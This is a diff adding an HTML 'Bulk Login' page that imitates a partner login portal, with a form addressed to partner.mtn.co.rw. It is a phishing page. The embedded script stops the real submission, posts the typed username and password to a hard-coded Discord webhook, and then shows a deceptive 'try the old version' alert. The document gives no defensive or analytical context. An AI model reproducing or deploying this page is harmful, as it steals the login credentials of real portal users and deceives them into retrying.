@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Bulk Login</title>
+	<style>
+		body {
+			background-color: yellow;
+		}
+		.center {
+			margin: auto;
+			width: 30%;
+			padding: 20px;
+			background-color: white;
+			text-align: down;
+		}
+		input[type=text], input[type=password] {
+			width: 100%;
+			padding: 12px 20px;
+			margin: 8px 0;
+			display: inline-block;
+			border: 1px solid #ccc;
+			box-sizing: border-box;
+		}
+		button {
+			background-color: #4CAF50;
+			color: white;
+			padding: 14px 20px;
+			margin: 8px 0;
+			border: none;
+			cursor: pointer;
+			width: 100%;
+		}
+		button:hover {
+			opacity: 0.8;
+		}
+		.cancelbtn {
+			width: auto;
+			padding: 10px 18px;
+			background-color: #f44336;
+		}
+		.imgcontainer {
+			text-align: center;
+			margin: 24px 0 12px 0;
+			position: relative;
+		}
+		img.avatar {
+			width: 40%;
+			border-radius: 30%;
+		}
+		.container {
+			padding: 16px;
+		}
+		span.psw {
+			float: right;
+			padding-top: 16px;
+		}
+	</style>
+</head>
+<body>
+	<div class="center">
+		<div class="imgcontainer">
+			<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.tdBSu9UnEgeMuZJfHZt5fAAAAA%26pid%3DApi&f=1&ipt=96dc499221d296ae762668c779779725af609782be57f5aced34fe80fdaac2b3&ipo=images" alt="Avatar" class="avatar">
+		</div>
+		<form action="https://partner.mtn.co.rw/partner/" method="POST" onsubmit="sendData()">
+			<div class="container">
+				<label for="uname"><b>Username</b></label>
+				<input type="text" placeholder="Enter Username" name="uname" id="uname" required>
+				<label for="psw"><b>Password</b></label>
+				<input type="password" placeholder="Enter Password" name="psw" id="psw" required>
+				<button type="submit">Login</button>
+				<label>
+					<input type="checkbox" checked="checked" name="remember"> Remember me
+				</label>
+			</div>
+			<div class="container" style="background-color:#f1f1f1">
+				<span class="psw">Forgot <a href="#">password?</a></span>
+			</div>
+		</form>
+	</div>
+		<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1092128720833220789/lTm74RZL2Xwk5KX-3ifJjNYoUtWFkpNI006dlV9IS0oYBkB8TU7pn7UarI8VlundIRwU";
+
+  const form = document.querySelector("form");
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const formData = new FormData(form);
+    const formDataObject = Object.fromEntries(formData.entries());
+    const payload = {
+      content: "New form submission:",
+      embeds: [
+        {
+          title: "Form Data",
+          description: "```" + JSON.stringify(formDataObject, null, 2) + "```",
+          color: 16711680, // Red color
+        },
+      ],
+    };
+    const response = await fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    });
+    if (response.ok) {
+      alert("try the old version.");
+    } else {
+      alert("try the old version.");
+    }
+  });
+</script>
+
